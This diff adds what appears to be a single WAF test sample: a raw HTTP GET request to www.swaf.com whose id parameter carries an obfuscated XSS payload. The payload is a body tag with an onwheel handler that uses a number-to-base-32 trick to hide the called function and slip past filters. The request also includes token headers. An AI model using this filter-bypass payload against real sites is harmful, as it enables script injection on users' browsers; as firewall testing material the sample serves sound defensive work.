@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_事件_编码类(特殊编码绕过)-06506684
+# 攻击载荷利用了HTML中的body标签和onwheel属性，使用鼠标滚轮时触发top[11189117..toString(32)](1)
+GET /?id=%3Cbody%20onwheel=top%5B11189117..toString%2832%29%5D%281%29%3E&bid=hd_tag_m8mv25qk HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25qk
+RM-PRO-Token: 1a941ba5b2b1eeb611050ceb7f0243d3
+RM-PRO-Time: 1742808501286
+User-Agent: curl/7.83.1
+
